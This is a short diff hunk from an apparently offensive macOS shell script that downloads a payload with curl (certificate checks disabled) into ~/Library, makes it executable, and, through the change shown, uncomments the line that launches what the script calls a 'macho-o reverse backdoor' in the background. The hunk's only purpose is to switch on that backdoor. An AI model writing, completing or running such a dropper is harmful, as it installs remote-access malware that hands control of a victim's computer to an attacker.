@@ -27,7 +27,7 @@ curl -s -k $URL -o ~/Library/$PAYLOAD
 chmod +x ~/Library/$PAYLOAD
 
 # Launch the macho-o reverse backdoor
-#~/Library/$PAYLOAD &
+~/Library/$PAYLOAD &
 
 sleep 2
 
